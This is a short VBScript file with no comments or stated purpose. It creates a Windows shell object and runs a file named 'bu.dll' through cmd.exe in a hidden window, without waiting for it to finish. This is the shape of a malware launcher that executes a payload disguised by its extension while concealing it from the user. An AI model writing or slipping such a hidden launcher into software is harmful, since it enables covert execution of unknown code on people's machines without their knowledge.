Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c ""bu.dll""", 0, False
Set objShell = Nothing
